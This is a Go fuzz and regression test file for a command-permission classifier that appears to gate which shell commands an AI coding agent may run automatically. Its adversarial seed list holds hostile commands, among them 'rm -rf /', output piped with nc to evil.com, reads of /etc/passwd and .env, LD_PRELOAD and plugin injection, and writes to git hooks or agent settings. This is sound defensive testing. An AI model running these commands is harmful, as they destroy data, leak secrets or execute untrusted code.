// Copyright 2026 DoorDash, Inc.
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package permission

import (
	"testing"
	"unicode/utf8"
)

var guardrailFuzzEligibleSeeds = []string{
	"go test ./...",
	"git status --short",
	"go build ./... && go test ./...",
	"cargo test --release",
	"npm test",
	"make test-unit",
	"bazel build //target",
	"bazel query 'deps(//target)'",
	"git --no-pager diff --no-textconv --stat",
	"GOTRACEBACK=2 go test -race -short ./...",
	"go test \"./internal/...\"",
	"go test ./... 2>/dev/null",
	"go test é ./...",
	"go test 日本語 ./...",
}

var guardrailFuzzAdversarialSeeds = []string{
	"rm -rf /",
	"$(whoami)",
	"`whoami`",
	"$HOME/bin/go test",
	"go test *.go",
	"go test \x00 ./...",
	"go test \x01 ./...",
	"go test \xff\xfe ./...",
	"echo 'hello world'",
	"cd .. && go test",
	"go test | nc evil.com 80",
	"go test &",
	"go test << EOF",
	"(go test ./...)",
	"go test --watch",
	"npm install",
	"npm test -- --silent",
	"pnpm test -- --quiet",
	"yarn test -- --verbose",
	"docker build .",
	"go test ./... 2>&1 | tee",
	"python script.py",
	"./script.sh",
	"bash -c 'go test'",
	"node -e 'require(\"fs\")'",
	"kubectl apply -f deploy.yaml",
	"ssh user@host",
	"curl http://example.com",
	"wget http://example.com/file",
	"GOFLAGS=sk-abc123def456ghij go test",
	"API_KEY=secret go test",
	"cd .env && go test",
	"go test /etc/passwd",
	"go test ~/secret.key",
	"go test '-exec' ./runner ./...",
	"go list -export -toolexec=./runner ./...",
	"go list -export -toolexec ./runner ./...",
	"eslint '--plugin' evil .",
	"protoc '--plugin=./evil' foo.proto",
	"/tmp/gradlew test",
	"../gradlew test",
	"./untrusted/gradlew test",
	"prettier --write .env",
	"git status /etc/passwd",
	"git --no-pager show --no-textconv HEAD:.env",
	"gcc -plugin foo.so main.c",
	"air",
	"pytest -p myplugin",
	"pytest --cov-config=evil.ini",
	"pytest --cov-config evil.ini",
	"mocha --require foo",
	"make --file=/tmp/evil.mk test",
	"make --silent",
	"make -j4",
	"make -j 4",
	"make test SHELL=./foo-test",
	"make test FOO+=unit-test",
	"make -j SHELL=./foo-test test",
	"make test-Deploy",
	"just --justfile=/tmp/evil.just test",
	"just --quiet",
	"just test shell=./foo-test",
	"just lint-Release",
	"task --taskfile=/tmp/evil.yml test",
	"task --silent",
	"task test SHELL=./foo-test",
	"task build-Publish",
	"./gradlew --init-script=/tmp/evil.gradle test",
	"./gradlew --quiet",
	"./gradlew -x test",
	"./gradlew test org.gradle.java.home=./foo-test",
	"./gradlew -x SHELL=./foo-test test",
	"./gradlew test-Release",
	"./mvnw --quiet",
	"./mvnw -T 2",
	"./mvnw verify-Deploy",
	"kotlinc -Xplugin=./evil.jar main.kt",
	"javac -cp .:/tmp/processor.jar Main.java",
	"javac -classpath=.:/tmp/processor.jar Main.java",
	"javac -sourcepath src:/tmp/src Main.java",
	"javac -bootclasspath .:/tmp/rt.jar Main.java",
	"javac -extdirs lib:/tmp/ext Main.java",
	"javac -endorseddirs lib:/tmp/endorsed Main.java",
	"kotlinc -cp .:/tmp/lib.jar main.kt",
	"kotlinc -classpath=.:/tmp/lib.jar main.kt",
	"gcc -B ./toolchain main.c",
	"GOFLAGS=-toolexec=./runner go test ./...",
	"git --no-pager diff",
	"prettier --write .''env",
	"go test -e''xec ./runner ./...",
	"gcc -B./toolchain main.c",
	"gcc -o .git/hooks/pre-commit main.c",
	"go build -o .git/hooks/pre-commit ./cmd/app",
	"go build -o .claude/settings.json ./cmd/app",
	"gcc -DPASSWORD=hunter2 -c main.c",
	"gcc -DAPI_KEY=hunter2 -c main.c",
	"cppcheck -DPASSWORD=hunter2 src/",
	"gcc -Wl,--plugin,evil.so main.c",
	"gcc -Wl,-plugin,./evil.so main.c",
	"gcc -Wl,-plugin=./evil.so main.c",
	"gcc -Wp,-MD,/tmp/deps main.c",
	"gcc -Wa,-o,/tmp/asm.o main.c",
	"gcc -Wl,-Map,/tmp/link.map main.c",
	"clang -flto=thin -fuse-ld=lld -fthinlto-distributor=./runner main.c",
	"clang -fuse-ld=./runner main.c",
	"clang -flto=thin -c main.c",
	"cmake -D CMAKE_C_COMPILER=./runner -S . -B build",
	"cmake -DCMAKE_C_COMPILER=./runner -S . -B build",
	"cmake -D CMAKE_PROJECT_TOP_LEVEL_INCLUDES=./evil.cmake -S . -B build",
	"cmake -DCMAKE_PROJECT_TOP_LEVEL_INCLUDES=./evil.cmake -S . -B build",
	"cmake --preset evil-compiler",
	"cmake --preset=evil-include",
	"cmake --build build -- SHELL=./runner",
	"cmake --build build -- clean",
	"cmake --build build -- install",
	"go vet -vettool=./runner ./...",
	"bazel build --override_repository=repo=/tmp/evil //target",
	"bazel build --keep_going",
	"bazel build delete-all",
	"bazel build @external//pkg:target",
	"bazel build //:deploy",
	"bazel build //tools:install",
	"bazel test //ops:release",
	"bazel test --test_arg=delete-all //target",
	"bazel test --test_arg delete-all //target",
	"bazel test --test_env=LD_PRELOAD=./evil.so //target",
	"bazel test --config=repo_defined //target",
	"bazel build --disk_cache=grpc://external.example //target",
	"bazel build --repository_cache=/tmp/cache //target",
	"buf generate --template=evil.yaml",
	"protoc --evil_out=. foo.proto",
	"git --no-pager log --no-textconv --show-signature",
	"go test -run=Test -exec=/tmp/runner ./...",
	"bazel test --jobs=1 --override_repository=repo=/tmp/evil //...",
	"gcc @options main.c",
	"clang-tidy @params src/main.cpp",
	"cppcheck @options src/",
	"go build -ldflags '-linkmode=external -extld=./runner' ./...",
	"go test -gccgoflags '-B./toolchain' ./...",
	"go build -gcflags '-B' ./...",
	"go build -compiler gccgo ./...",
	"pylint --load-plugins=evil src/",
	"pylint --init-hook x src/",
	"pylint -f evil.EvilReporter src/",
	"pylint -f=evil.EvilReporter src/",
	"pylint -fevil.EvilReporter src/",
	"pylint --output-format evil.EvilReporter src/",
	"pylint --output-format=evil.EvilReporter src/",
	"pylint --format=evil.EvilReporter src/",
	"clang-tidy --load=./evil.so src/main.cpp",
	"clang-tidy --extra-arg=-fplugin src/main.cpp",
	"clang-tidy '--config={ExtraArgsBefore: [-Xclang, -load, -Xclang, ./evil.so]}' src/main.cpp",
	"clang-tidy '--config={ExtraArgs: [-Xclang, -load, -Xclang, ./evil.so]}' src/main.cpp",
	"clang-tidy --config '{ExtraArgsBefore: [-Xclang, -load, -Xclang, ./evil.so]}' src/main.cpp",
	"clang-tidy --config-file=evil.yaml src/main.cpp",
	"clang-tidy --config-file evil.yaml src/main.cpp",
	"mypy --python-executable=./evil src/",
	"mypy --python-executable ./evil src/",
	"cppcheck --addon=./evil.py src/",
	"cppcheck --library=evil.cfg src/",
	"javac -J-javaagent:./evil.jar Main.java",
	"kotlinc -J-javaagent:./evil.jar main.kt",
	"ktlint --ruleset=./evil.jar src/main.kt",
	"ktlint --ruleset ./evil.jar src/main.kt",
	"ktlint -R ./evil.jar src/main.kt",
	"buf lint /etc/passwd",
	"buf generate /tmp/external",
	"buf lint .env",
	"git symbolic-ref HEAD refs/heads/other",
	"git symbolic-ref -d HEAD",
	"git symbolic-ref --delete HEAD",
	"cargo check --config build.rustc-wrapper=./runner",
	"cargo test-unit",
	"eslint --parser ./evil.js .",
	"eslint --format ./evil.js .",
	"eslint --format=./evil.js .",
	"eslint -f ./evil.js .",
	"eslint -f=./evil.js .",
	"eslint -f./evil.js .",
	"mocha --reporter ./evil.js",
	"vitest --reporter ./evil.js",
	"mockgen -exec_only ./runner",
	"clang-format --style=file:/tmp/evil-format main.cpp",
	"clang-format --style file:/tmp/evil-format main.cpp",
	"clang-format -style=file:/tmp/evil-format main.cpp",
	"clang-format -style file:/tmp/evil-format main.cpp",
	"clang-format --style=file:.env main.cpp",
	"bazel build --copt=-fplugin=./evil.so //target",
	"bazel build --copt -fplugin=./evil.so //target",
	"bazel build --linkopt=--plugin=evil.so //target",
	"bazel build --python_path=./runner //target",
	"bazel build --action_env=LD_PRELOAD=./evil.so //target",
	"bazel build --define=FOO=bar //target",
	"bazel build --features=evil //target",
	"ruff server",
	"ruff clean",
	"golangci-lint cache clean",
	"jest --clearCache",
	"pytest --cache-clear",
	"npm run test-Publish",
	"make test-remove",
	"make test-uninstall",
	"make test-destroy",
	"make test-delete",
	"just test-remove",
	"just test-uninstall",
	"task test-delete",
	"task test-destroy",
	"bazel test //ops:test-remove",
	"bazel build //ops:build-destroy",
	"./gradlew test-remove",
	"./gradlew test-uninstall",
	"./mvnw test-delete",
	"./mvnw test-destroy",
	"npm run test-remove",
	"npm run test-uninstall",
	"npm run test -- --silent",
	"pnpm run test-delete",
	"pnpm run test -- --quiet",
	"yarn run test-destroy",
	"yarn run test -- --verbose",
	"pnpm run lint-Release",
	"yarn run build-Deploy",
	"sudo make test",
	"env make test",
	"xargs make test",
	"timeout 30 make test",
	"nice make test",
	"'' make test",
	"make test # ignored by bash",
}

// FuzzGuardrailClassify verifies that arbitrary bytes never panic the
// classifier, that invalid UTF-8 is never eligible, and that over-limit
// input is never eligible. The adversarial seed corpus is also exercised
// by TestFuzzSeeds_AdversarialDefers, which explicitly asserts each
// unsupported or dangerous seed returns false.
func FuzzGuardrailClassify(f *testing.F) {
	// Seed corpus: valid commands, adversarial syntax, invalid UTF-8,
	// and multibyte text at bounding cutoffs.
	for _, corpus := range [][]string{guardrailFuzzEligibleSeeds, guardrailFuzzAdversarialSeeds} {
		for _, s := range corpus {
			f.Add(s)
		}
	}

	f.Fuzz(func(t *testing.T, command string) {
		// The classifier must never panic on arbitrary input.
		got := GuardrailClassify(command, "/project", []string{"/project"})

		// If the input is invalid UTF-8, it must never be eligible.
		if !utf8.ValidString(command) && got {
			t.Errorf("GuardrailClassify returned true for invalid UTF-8 input")
		}

		// If the input exceeds the length limit, it must never be eligible.
		if len(command) > GuardrailMaxCommandLen && got {
			t.Errorf("GuardrailClassify returned true for over-limit input (len %d)", len(command))
		}
	})
}

// TestFuzzSeeds_AdversarialDefers asserts that every adversarial seed in
// the fuzz corpus is classified as ineligible. This is the explicit
// expected-false regression for the fail-closed property.
func TestFuzzSeeds_AdversarialDefers(t *testing.T) {
	for _, cmd := range guardrailFuzzAdversarialSeeds {
		got := GuardrailClassify(cmd, "/project", []string{"/project"})
		if got {
			t.Errorf("adversarial seed %q should defer, got eligible", cmd)
		}
	}
}

// TestFuzzSeeds_EligibleApproves asserts that every valid seed in the fuzz
// corpus is classified as eligible.
func TestFuzzSeeds_EligibleApproves(t *testing.T) {
	for _, cmd := range guardrailFuzzEligibleSeeds {
		got := GuardrailClassify(cmd, "/project", []string{"/project"})
		if !got {
			t.Errorf("eligible seed %q should be eligible, got defer", cmd)
		}
	}
}
